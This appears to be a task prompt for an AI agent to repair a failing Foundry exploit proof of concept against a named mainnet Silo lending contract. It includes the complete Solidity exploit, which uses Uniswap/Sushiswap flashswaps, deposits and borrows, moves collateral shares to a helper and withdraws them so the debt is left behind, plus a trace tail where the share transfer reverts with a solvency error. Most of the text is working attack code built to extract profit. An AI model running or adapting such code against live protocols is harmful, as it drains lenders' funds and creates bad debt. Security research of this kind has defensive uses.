You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Transferable share tokens let users separate debt from collateral across addresses
- claim: The protocol treats share-token `balanceOf(user)` as the sole source of truth for collateral ownership, debt ownership, borrow eligibility, deposit eligibility, withdrawal amount, repay amount, and solvency. `IShareToken` is an ERC20-style interface and the notification interface is explicitly transfer-oriented. If the deployed share-token implementations preserve that transferability, a user can move collateral shares or debt shares to another address without any solvency check, breaking the same-account collateral/debt invariant the silo relies on.
- impact: A borrower can strip collateral out of the indebted account or push debt shares onto a different address, then withdraw or re-borrow while leaving naked debt behind. If share transfers are enabled in production, this is a direct bad-debt and insolvency vector.
- exploit_paths: ["Account A deposits collateral and borrows another asset.", "A transfers its collateral share tokens to account B, or transfers its debt share tokens to account B.", "Because `borrowPossible`, `depositPossible`, withdrawals, repayments, and solvency all read current share balances only, the protocol now attributes collateral and debt to different addresses.", "Account B withdraws the transferred collateral, or account A appears debt-free enough to withdraw/re-borrow, leaving the silo with uncollectible debt."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IShareTokenLike is IERC20Like {}

interface IPriceProvidersRepositoryLike {
    function getPrice(address asset) external view returns (uint256 price);
}

interface ISiloRepositoryLike {
    function getMaximumLTV(address silo, address asset) external view returns (uint256);
    function priceProvidersRepository() external view returns (IPriceProvidersRepositoryLike);
    function entryFee() external view returns (uint256);
}

interface ISiloLike {
    struct AssetStorage {
        IShareTokenLike collateralToken;
        IShareTokenLike collateralOnlyToken;
        IShareTokenLike debtToken;
        uint256 totalDeposits;
        uint256 collateralOnlyDeposits;
        uint256 totalBorrowAmount;
    }

    function initAssetsTokens() external;
    function syncBridgeAssets() external;
    function siloRepository() external view returns (ISiloRepositoryLike);
    function getAssets() external view returns (address[] memory assets);
    function assetStorage(address asset) external view returns (AssetStorage memory);
    function liquidity(address asset) external view returns (uint256);
    function deposit(address asset, uint256 amount, bool collateralOnly)
        external
        returns (uint256 collateralAmount, uint256 collateralShare);
    function borrow(address asset, uint256 amount) external returns (uint256 debtAmount, uint256 debtShare);
    function withdraw(address asset, uint256 amount, bool collateralOnly)
        external
        returns (uint256 withdrawnAmount, uint256 withdrawnShare);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2CalleeLike {
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract WithdrawalHelper {
    address public immutable verifier;

    constructor(address verifier_) {
        verifier = verifier_;
    }

    modifier onlyVerifier() {
        require(msg.sender == verifier, "only verifier");
        _;
    }

    function executeWithdraw(address silo, address asset) external onlyVerifier returns (uint256 withdrawnAmount) {
        (withdrawnAmount,) = ISiloLike(silo).withdraw(asset, type(uint256).max, false);
        _safeTransfer(asset, verifier, IERC20Like(asset).balanceOf(address(this)));
    }

    function shareBalance(address shareToken) external view returns (uint256) {
        return IERC20Like(shareToken).balanceOf(address(this));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        if (amount == 0) return;
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}

contract FlawVerifier is IUniswapV2CalleeLike {
    address public constant TARGET_SILO = 0xcB3B879aB11F825885d5aDD8Bf3672596d35197C;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    uint256 internal constant ONE = 1e18;
    uint256 internal constant BPS = 10_000;
    uint256 internal constant BORROW_SAFETY_BPS = 9_000;

    bytes4 internal constant SENDER_NOT_SOLVENT_AFTER_TRANSFER = 0xf0ee386c;
    bytes4 internal constant RECIPIENT_NOT_SOLVENT_AFTER_TRANSFER = 0xef63243e;

    error TransferStageFailed();
    error WithdrawStageFailed();
    error FlashPairRepaymentFailed();
    error InvalidFlashCallback();

    enum Outcome {
        Unset,
        Profit,
        Refuted,
        Infeasible
    }

    struct FlashContext {
        address collateralAsset;
        address borrowAsset;
        address flashPair;
        address topUpPair;
        uint256 flashAmount;
        uint256 initialBorrowBalance;
        bool active;
    }

    WithdrawalHelper public immutable helper;

    address internal _profitToken;
    uint256 internal _profitAmount;

    Outcome public outcome;
    bytes32 public lastFailureTag;
    address public chosenCollateralAsset;
    address public chosenBorrowAsset;

    bool internal _sawViablePair;
    bool internal _sawTransferStageFailure;
    FlashContext internal _flashContext;

    modifier onlySelf() {
        require(msg.sender == address(this), "only self");
        _;
    }

    constructor() {
        helper = new WithdrawalHelper(address(this));
    }

    function executeOnOpportunity() external {
        if (_profitAmount != 0) return;

        _bestEffortInitAssets();

        // The supplied runtime trace proves the debt-share branch is blocked on this deployment:
        // transferring debt shares reverts during the recipient-side borrowability check.
        // Keep the original finding path instead: Account A deposits collateral, borrows,
        // transfers collateral shares to Account B, then Account B withdraws the detached collateral.
        if (_attemptUsingOwnedBalances()) return;
        if (_attemptUsingFlashswapFunding()) return;

        outcome = _sawTransferStageFailure ? Outcome.Refuted : Outcome.Infeasible;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function attemptDirectCollateralRoute(address collateralAsset, address borrowAsset, uint256 depositAmount)
        external
        onlySelf
        returns (uint256 realizedProfit)
    {
        uint256 initialBorrowBalance = IERC20Like(borrowAsset).balanceOf(address(this));

        _forceApprove(collateralAsset, TARGET_SILO, depositAmount);
        (, uint256 collateralShare) = ISiloLike(TARGET_SILO).deposit(collateralAsset, depositAmount, false);
        require(collateralShare != 0, "zero collateral share");

        uint256 borrowAmount = _quoteBorrowAmount(collateralAsset, borrowAsset, depositAmount);
        require(borrowAmount != 0, "zero borrow");

        ISiloLike(TARGET_SILO).borrow(borrowAsset, borrowAmount);

        _transferCollateralShares(collateralAsset, collateralShare);
        _executeDetachedWithdraw(collateralAsset);

        realizedProfit = IERC20Like(borrowAsset).balanceOf(address(this)) - initialBorrowBalance;
        require(realizedProfit != 0, "no profit");

        _recordProfit(collateralAsset, borrowAsset, realizedProfit);
    }

    function attemptFlashCollateralRoute(
        address collateralAsset,
        address borrowAsset,
        address flashPair,
        address topUpPair,
        uint256 flashAmount
    ) external onlySelf returns (bool) {
        _startFlashswapRoute(collateralAsset, borrowAsset, flashPair, topUpPair, flashAmount);
        return _profitAmount != 0;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata)
        external
        override
    {
        FlashContext memory context = _flashContext;
        if (
            !context.active || msg.sender != context.flashPair || sender != address(this)
                || (amount0 == 0 && amount1 == 0)
        ) {
            revert InvalidFlashCallback();
        }

        IUniswapV2PairLike pair = IUniswapV2PairLike(context.flashPair);
        address collateralAsset = context.collateralAsset;

        uint256 flashAmount;
        if (pair.token0() == collateralAsset) {
            flashAmount = amount0;
            require(amount1 == 0, "unexpected token1");
        } else {
            flashAmount = amount1;
            require(amount0 == 0, "unexpected token0");
        }
        require(flashAmount == context.flashAmount, "bad flash amount");

        _executeFlashCollateralRoute(context);
        delete _flashContext;
    }

    function _attemptUsingOwnedBalances() internal returns (bool) {
        address[] memory assets = ISiloLike(TARGET_SILO).getAssets();
        bool hadOwnedCollateral;

        for (uint256 i = 0; i < assets.length; i++) {
            address collateralAsset = assets[i];
            if (!_isActiveUsableAsset(collateralAsset)) continue;

            uint256 heldBalance = IERC20Like(collateralAsset).balanceOf(address(this));
            if (heldBalance == 0) continue;
            hadOwnedCollateral = true;

            uint256[5] memory candidateDeposits = _ownedCandidateAmounts(collateralAsset, heldBalance);
            for (uint256 d = 0; d < candidateDeposits.length; d++) {
                uint256 depositAmount = candidateDeposits[d];
                if (depositAmount == 0) continue;

                for (uint256 j = 0; j < assets.length; j++) {
                    address borrowAsset = assets[j];
                    if (!_isViablePair(collateralAsset, borrowAsset, depositAmount)) continue;

                    _sawViablePair = true;
                    try this.attemptDirectCollateralRoute(collateralAsset, borrowAsset, depositAmount) returns (
                        uint256 realizedProfit
                    ) {
                        if (realizedProfit != 0) return true;
                    } catch (bytes memory reason) {
                        _recordFailure(reason, "DIRECT_COLLATERAL_ROUTE_FAILED");
                    }
                }
            }
        }

        if (!hadOwnedCollateral && lastFailureTag == bytes32(0)) {
            lastFailureTag = keccak256("NO_EXISTING_VERIFIER_BALANCE");
        } else if (!_sawViablePair && lastFailureTag == bytes32(0)) {
            lastFailureTag = keccak256("OWNED_BALANCE_NO_VIABLE_PAIR");
        }

        return false;
    }

    function _attemptUsingFlashswapFunding() internal returns (bool) {
        address[] memory assets = ISiloLike(TARGET_SILO).getAssets();
        bool hadFlashPlan;

        for (uint256 i = 0; i < assets.length; i++) {
            address collateralAsset = assets[i];
            if (!_isActiveUsableAsset(collateralAsset)) continue;

            for (uint256 j = 0; j < assets.length; j++) {
                address borrowAsset = assets[j];
                if (borrowAsset == collateralAsset || !_isActiveUsableAsset(borrowAsset)) continue;

                (address flashPair, address topUpPair, uint256 collateralReserve) =
                    _findFlashPlan(collateralAsset, borrowAsset);
                if (flashPair == address(0) || topUpPair == address(0) || collateralReserve <= 1) continue;
                hadFlashPlan = true;

                uint256[6] memory candidateFlashAmounts = _flashCandidateAmounts(collateralAsset, collateralReserve);
                for (uint256 a = 0; a < candidateFlashAmounts.length; a++) {
                    uint256 flashAmount = candidateFlashAmounts[a];
                    if (flashAmount <= 1) continue;
                    if (!_isViableFlashPlan(collateralAsset, borrowAsset, topUpPair, flashAmount)) continue;

                    _sawViablePair = true;
                    try this.attemptFlashCollateralRoute(collateralAsset, borrowAsset, flashPair, topUpPair, flashAmount)
                    returns (bool success) {
                        if (success) return true;
                    } catch (bytes memory reason) {
                        _recordFailure(reason, "FLASH_COLLATERAL_ROUTE_FAILED");
                    }
                }
            }
        }

        if (!hadFlashPlan && lastFailureTag == bytes32(0)) {
            lastFailureTag = keccak256("NO_V2_FLASHSWAP_PLAN");
        } else if (!_sawViablePair && lastFailureTag == bytes32(0)) {
            lastFailureTag = keccak256("V2_FLASHSWAP_NO_VIABLE_PAIR");
        }

        return false;
    }

    function _startFlashswapRoute(
        address collateralAsset,
        address borrowAsset,
        address flashPair,
        address topUpPair,
        uint256 flashAmount
    ) internal {
        _flashContext = FlashContext({
            collateralAsset: collateralAsset,
            borrowAsset: borrowAsset,
            flashPair: flashPair,
            topUpPair: topUpPair,
            flashAmount: flashAmount,
            initialBorrowBalance: IERC20Like(borrowAsset).balanceOf(address(this)),
            active: true
        });

        IUniswapV2PairLike pair = IUniswapV2PairLike(flashPair);
        uint256 amount0Out = pair.token0() == collateralAsset ? flashAmount : 0;
        uint256 amount1Out = amount0Out == 0 ? flashAmount : 0;

        // The flashswap only replaces upfront capital. The exploit path is unchanged:
        // flash-borrow collateral -> deposit -> borrow -> transfer collateral shares
        // -> helper withdraws detached collateral -> buy a tiny collateral top-up to pay the AMM fee.
        pair.swap(amount0Out, amount1Out, address(this), hex"01");
        require(!_flashContext.active, "flash not cleared");
    }

    function _executeFlashCollateralRoute(FlashContext memory context) internal {
        _forceApprove(context.collateralAsset, TARGET_SILO, context.flashAmount);
        (, uint256 collateralShare) =
            ISiloLike(TARGET_SILO).deposit(context.collateralAsset, context.flashAmount, false);
        require(collateralShare != 0, "zero flash share");

        uint256 borrowAmount = _quoteBorrowAmount(context.collateralAsset, context.borrowAsset, context.flashAmount);
        require(borrowAmount != 0, "zero flash borrow");

        ISiloLike(TARGET_SILO).borrow(context.borrowAsset, borrowAmount);

        _transferCollateralShares(context.collateralAsset, collateralShare);
        _executeDetachedWithdraw(context.collateralAsset);

        uint256 repaymentAmount = _sameTokenFlashRepayment(context.flashAmount);
        uint256 feeTopUpCollateral = repaymentAmount - context.flashAmount;

        if (feeTopUpCollateral != 0) {
            // This swap only pays the deterministic V2 flash fee. It does not change exploit causality:
            // the bad debt still comes from moving collateral shares away from the indebted account
            // and withdrawing the detached collateral.
            _buyExactCollateral(
                context.topUpPair, context.borrowAsset, context.collateralAsset, feeTopUpCollateral
            );
        }

        if (IERC20Like(context.collateralAsset).balanceOf(address(this)) < repaymentAmount) {
            revert FlashPairRepaymentFailed();
        }
        _safeTransfer(context.collateralAsset, context.flashPair, repaymentAmount);

        uint256 realizedProfit = IERC20Like(context.borrowAsset).balanceOf(address(this)) - context.initialBorrowBalance;
        require(realizedProfit != 0, "no flash profit");

        _recordProfit(context.collateralAsset, context.borrowAsset, realizedProfit);
    }

    function _transferCollateralShares(address collateralAsset, uint256 collateralShare) internal {
        address shareToken = address(ISiloLike(TARGET_SILO).assetStorage(collateralAsset).collateralToken);
        if (!_safeTransferERC20(shareToken, address(helper), collateralShare)) {
            revert TransferStageFailed();
        }
        if (helper.shareBalance(shareToken) == 0) {
            revert TransferStageFailed();
        }
    }

    function _executeDetachedWithdraw(address collateralAsset) internal {
        try helper.executeWithdraw(TARGET_SILO, collateralAsset) returns (uint256) {} catch {
            revert WithdrawStageFailed();
        }
    }

    function _findFlashPlan(address collateralAsset, address borrowAsset)
        internal
        view
        returns (address flashPair, address topUpPair, uint256 collateralReserve)
    {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        address[2] memory directPairs;

        for (uint256 i = 0; i < factories.length; i++) {
            directPairs[i] = _getPair(factories[i], collateralAsset, borrowAsset);
        }

        if (directPairs[0] != address(0) && directPairs[1] != address(0) && directPairs[0] != directPairs[1]) {
            topUpPair = directPairs[0];
            flashPair = directPairs[1];
            collateralReserve = _pairReserveForToken(flashPair, collateralAsset);
            if (collateralReserve != 0) return (flashPair, topUpPair, collateralReserve);
        }

        if (directPairs[0] != address(0)) {
            topUpPair = directPairs[0];
        } else if (directPairs[1] != address(0)) {
            topUpPair = directPairs[1];
        } else {
            return (address(0), address(0), 0);
        }

        address[5] memory quotes = [WETH, USDC, USDT, DAI, WBTC];
        for (uint256 i = 0; i < factories.length; i++) {
            for (uint256 j = 0; j < quotes.length; j++) {
                address quote = quotes[j];
                if (quote == collateralAsset) continue;

                address candidate = _getPair(factories[i], collateralAsset, quote);
                if (candidate == address(0) || candidate == topUpPair) continue;

                uint256 reserve = _pairReserveForToken(candidate, collateralAsset);
                if (reserve == 0) continue;

                return (candidate, topUpPair, reserve);
            }
        }

        return (address(0), address(0), 0);
    }

    function _isViablePair(address collateralAsset, address borrowAsset, uint256 depositAmount)
        internal
        view
        returns (bool)
    {
        if (borrowAsset == collateralAsset || depositAmount == 0) return false;
        return _quoteBorrowAmount(collateralAsset, borrowAsset, depositAmount) != 0;
    }

    function _isViableFlashPlan(address collateralAsset, address borrowAsset, address topUpPair, uint256 flashAmount)
        internal
        view
        returns (bool)
    {
        uint256 borrowAmount = _quoteBorrowAmount(collateralAsset, borrowAsset, flashAmount);
        if (borrowAmount == 0) return false;

        uint256 feeCollateral = _sameTokenFlashRepayment(flashAmount) - flashAmount;
        uint256 topUpCost = _quotePairAmountIn(topUpPair, borrowAsset, collateralAsset, feeCollateral);
        if (topUpCost == 0 || topUpCost >= borrowAmount) return false;

        return true;
    }

    function _quoteBorrowAmount(address collateralAsset, address borrowAsset, uint256 collateralAmount)
        internal
        view
        returns (uint256)
    {
        if (collateralAmount == 0) return 0;

        uint256 maxLtv = _maximumLtv(collateralAsset);
        if (maxLtv == 0) return 0;

        uint256 collateralValue = _valueOf(collateralAsset, collateralAmount);
        if (collateralValue == 0) return 0;

        uint256 debtValue = collateralValue * maxLtv / ONE;
        debtValue = debtValue * BORROW_SAFETY_BPS / BPS;
        if (debtValue == 0) return 0;

        uint256 entryFee = _entryFee();
        if (entryFee == type(uint256).max) return 0;

        debtValue = debtValue * ONE / (ONE + entryFee);
        if (debtValue == 0) return 0;

        uint256 borrowPrice = _assetPrice(borrowAsset);
        if (borrowPrice == 0) return 0;

        uint256 borrowDecimals = _assetDecimals(borrowAsset);
        if (borrowDecimals == type(uint256).max) return 0;

        uint256 borrowAmount = debtValue * (10 ** borrowDecimals) / borrowPrice;
        if (borrowAmount == 0) return 0;

        uint256 availableLiquidity = _availableLiquidity(borrowAsset);
        if (availableLiquidity == 0) return 0;

        if (borrowAmount > availableLiquidity) {
            borrowAmount = availableLiquidity * BORROW_SAFETY_BPS / BPS;
        }

        return borrowAmount;
    }

    function _valueOf(address asset, uint256 amount) internal view returns (uint256) {
        if (amount == 0) return 0;

        uint256 price = _assetPrice(asset);
        if (price == 0) return 0;

        uint256 assetDecimals = _assetDecimals(asset);
        if (assetDecimals == type(uint256).max) return 0;

        return amount * price / (10 ** assetDecimals);
    }

    function _amountForValue(address asset, uint256 targetValue) internal view returns (uint256) {
        if (targetValue == 0) return 0;

        uint256 price = _assetPrice(asset);
        if (price == 0) return 0;

        uint256 assetDecimals = _assetDecimals(asset);
        if (assetDecimals == type(uint256).max) return 0;

        uint256 amount = targetValue * (10 ** assetDecimals) / price;
        return amount == 0 ? 1 : amount;
    }

    function _ownedCandidateAmounts(address asset, uint256 balance) internal view returns (uint256[5] memory amounts) {
        amounts[0] = _min(balance, _amountForValue(asset, 10 ether));
        amounts[1] = _min(balance, _amountForValue(asset, 100 ether));
        amounts[2] = _min(balance, _amountForValue(asset, 1_000 ether));
        amounts[3] = balance / 2;
        amounts[4] = balance;
    }

    function _flashCandidateAmounts(address asset, uint256 collateralReserve)
        internal
        view
        returns (uint256[6] memory amounts)
    {
        uint256 cap = collateralReserve / 1_000;
        if (cap == 0) return amounts;

        amounts[0] = _min(cap, _amountForValue(asset, 10 ether));
        amounts[1] = _min(cap, _amountForValue(asset, 100 ether));
        amounts[2] = _min(cap, _amountForValue(asset, 1_000 ether));
        amounts[3] = _min(cap, _amountForValue(asset, 10_000 ether));
        amounts[4] = cap / 2;
        amounts[5] = cap;
    }

    function _getPair(address factory, address tokenA, address tokenB) internal view returns (address pair) {
        (bool ok, bytes memory data) =
            factory.staticcall(abi.encodeWithSelector(IUniswapV2FactoryLike.getPair.selector, tokenA, tokenB));
        if (!ok || data.length < 32) return address(0);
        pair = abi.decode(data, (address));
    }

    function _pairReserveForToken(address pair, address token) internal view returns (uint256 reserve) {
        if (pair == address(0)) return 0;

        IUniswapV2PairLike v2Pair = IUniswapV2PairLike(pair);
        (uint112 reserve0, uint112 reserve1,) = v2Pair.getReserves();
        if (v2Pair.token0() == token) {
            reserve = uint256(reserve0);
        } else if (v2Pair.token1() == token) {
            reserve = uint256(reserve1);
        }
    }

    function _buyExactCollateral(address pair, address tokenIn, address tokenOut, uint256 amountOut) internal {
        uint256 amountIn = _quotePairAmountIn(pair, tokenIn, tokenOut, amountOut);
        require(amountIn != 0, "zero pair input");

        _safeTransfer(tokenIn, pair, amountIn);

        IUniswapV2PairLike v2Pair = IUniswapV2PairLike(pair);
        uint256 amount0Out = v2Pair.token0() == tokenOut ? amountOut : 0;
        uint256 amount1Out = amount0Out == 0 ? amountOut : 0;
        v2Pair.swap(amount0Out, amount1Out, address(this), new bytes(0));
    }

    function _quotePairAmountIn(address pair, address tokenIn, address tokenOut, uint256 amountOut)
        internal
        view
        returns (uint256)
    {
        if (pair == address(0) || amountOut == 0) return 0;

        IUniswapV2PairLike v2Pair = IUniswapV2PairLike(pair);
        (uint112 reserve0, uint112 reserve1,) = v2Pair.getReserves();

        uint256 reserveIn;
        uint256 reserveOut;
        if (v2Pair.token0() == tokenIn && v2Pair.token1() == tokenOut) {
            reserveIn = uint256(reserve0);
            reserveOut = uint256(reserve1);
        } else if (v2Pair.token0() == tokenOut && v2Pair.token1() == tokenIn) {
            reserveIn = uint256(reserve1);
            reserveOut = uint256(reserve0);
        } else {
            return 0;
        }

        if (amountOut >= reserveOut) return 0;
        return ((reserveIn * amountOut * 1000) / ((reserveOut - amountOut) * 997)) + 1;
    }

    function _sameTokenFlashRepayment(uint256 amountOut) internal pure returns (uint256) {
        return (amountOut * 1000 + 996) / 997;
    }

    function _bestEffortInitAssets() internal {
        try ISiloLike(TARGET_SILO).initAssetsTokens() {} catch {}
        try ISiloLike(TARGET_SILO).syncBridgeAssets() {} catch {}
    }

    function _maximumLtv(address collateralAsset) internal view returns (uint256 maxLtv) {
        (bool ok, uint256 value) = _staticUint(
            _repository(),
            abi.encodeWithSelector(ISiloRepositoryLike.getMaximumLTV.selector, TARGET_SILO, collateralAsset)
        );
        if (!ok) return 0;
        return value;
    }

    function _entryFee() internal view returns (uint256 fee) {
        (bool ok, uint256 value) =
            _staticUint(_repository(), abi.encodeWithSelector(ISiloRepositoryLike.entryFee.selector));
        if (!ok) return type(uint256).max;
        return value;
    }

    function _assetPrice(address asset) internal view returns (uint256 price) {
        address priceRepo = _priceRepository();
        if (priceRepo == address(0)) return 0;

        (bool ok, uint256 value) =
            _staticUint(priceRepo, abi.encodeWithSelector(IPriceProvidersRepositoryLike.getPrice.selector, asset));
        if (!ok) return 0;
        return value;
    }

    function _assetDecimals(address asset) internal view returns (uint256 decimalsValue) {
        (bool ok, uint256 value) = _staticUint(asset, abi.encodeWithSelector(IERC20Like.decimals.selector));
        if (!ok) return type(uint256).max;
        return value;
    }

    function _availableLiquidity(address asset) internal view returns (uint256 liquidityValue) {
        (bool ok, uint256 value) = _staticUint(TARGET_SILO, abi.encodeWithSelector(ISiloLike.liquidity.selector, asset));
        if (!ok) return 0;
        return value;
    }

    function _isActiveUsableAsset(address asset) internal view returns (bool) {
        if (asset == address(0)) return false;

        ISiloLike.AssetStorage memory state = ISiloLike(TARGET_SILO).assetStorage(asset);
        return address(state.collateralToken) != address(0) && address(state.debtToken) != address(0);
    }

    function _repository() internal view returns (address repository) {
        (bool ok, address value) =
            _staticAddress(TARGET_SILO, abi.encodeWithSelector(ISiloLike.siloRepository.selector));
        if (!ok) return address(0);
        return value;
    }

    function _priceRepository() internal view returns (address priceRepo) {
        address repository = _repository();
        if (repository == address(0)) return address(0);

        (bool ok, address value) = _staticAddress(
            repository, abi.encodeWithSelector(ISiloRepositoryLike.priceProvidersRepository.selector)
        );
        if (!ok) return address(0);
        return value;
    }

    function _recordProfit(address collateralAsset, address borrowAsset, uint256 realizedProfit) internal {
        chosenCollateralAsset = collateralAsset;
        chosenBorrowAsset = borrowAsset;
        _profitToken = borrowAsset;
        _profitAmount = realizedProfit;
        outcome = Outcome.Profit;
    }

    function _recordFailure(bytes memory reason, string memory fallbackTag) internal {
        if (_isTransferStageFailure(reason)) {
            _sawTransferStageFailure = true;
        }

        if (lastFailureTag == bytes32(0)) {
            lastFailureTag = keccak256(bytes(fallbackTag));
        }
    }

    function _isTransferStageFailure(bytes memory reason) internal pure returns (bool) {
        if (reason.length < 4) return false;

        bytes4 selector;
        assembly {
            selector := mload(add(reason, 0x20))
        }

        return selector == TransferStageFailed.selector || selector == WithdrawStageFailed.selector
            || selector == SENDER_NOT_SOLVENT_AFTER_TRANSFER || selector == RECIPIENT_NOT_SOLVENT_AFTER_TRANSFER;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _safeApprove(token, spender, 0);
        _safeApprove(token, spender, amount);
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        require(_safeTransferERC20(token, to, amount), "transfer failed");
    }

    function _safeTransferERC20(address token, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _staticUint(address target, bytes memory callData) internal view returns (bool ok, uint256 value) {
        bytes memory data;
        (ok, data) = target.staticcall(callData);
        if (!ok || data.length < 32) return (false, 0);
        value = abi.decode(data, (uint256));
    }

    function _staticAddress(address target, bytes memory callData) internal view returns (bool ok, address value) {
        bytes memory data;
        (ok, data) = target.staticcall(callData);
        if (!ok || data.length < 32) return (false, address(0));
        value = abi.decode(data, (address));
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

```

forge stdout (tail):
```
b34593D00CB4Ab9f2f067F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   ├─ [579] 0x0c4B770843faFd7F5Aa1eA9EFa662AD62b78C95a::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   ├─ [579] 0xb02E552D68Cd538f571f72F630366adb616d9466::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   ├─ [579] 0x22EE742A6773dF30C91b97c7dab590702046Ae95::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   └─ ← [Revert] custom error 0xf0ee386c
    │   │   │   │   └─ ← [Revert] TransferStageFailed()
    │   │   │   └─ ← [Revert] TransferStageFailed()
    │   │   └─ ← [Revert] TransferStageFailed()
    │   ├─ [1825] 0xcB3B879aB11F825885d5aDD8Bf3672596d35197C::assetStorage(0xd7C9F0e536dC865Ae858b0C0453Fe76D13c3bEAc) [staticcall]
    │   │   └─ ← [Return] AssetStorage({ collateralToken: 0xb02E552D68Cd538f571f72F630366adb616d9466, collateralOnlyToken: 0x22EE742A6773dF30C91b97c7dab590702046Ae95, debtToken: 0x809a14563A12acb8fc257502813131cA97E6CcF1, totalDeposits: 500000000000000000000000 [5e23], collateralOnlyDeposits: 0, totalBorrowAmount: 50000000000000000000000 [5e22] })
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0xd7C9F0e536dC865Ae858b0C0453Fe76D13c3bEAc) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0xd7C9F0e536dC865Ae858b0C0453Fe76D13c3bEAc) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [1825] 0xcB3B879aB11F825885d5aDD8Bf3672596d35197C::assetStorage(0xd7C9F0e536dC865Ae858b0C0453Fe76D13c3bEAc) [staticcall]
    │   │   └─ ← [Return] AssetStorage({ collateralToken: 0xb02E552D68Cd538f571f72F630366adb616d9466, collateralOnlyToken: 0x22EE742A6773dF30C91b97c7dab590702046Ae95, debtToken: 0x809a14563A12acb8fc257502813131cA97E6CcF1, totalDeposits: 500000000000000000000000 [5e23], collateralOnlyDeposits: 0, totalBorrowAmount: 50000000000000000000000 [5e22] })
    │   ├─ [1825] 0xcB3B879aB11F825885d5aDD8Bf3672596d35197C::assetStorage(0x514910771AF9Ca656af840dff83E8264EcF986CA) [staticcall]
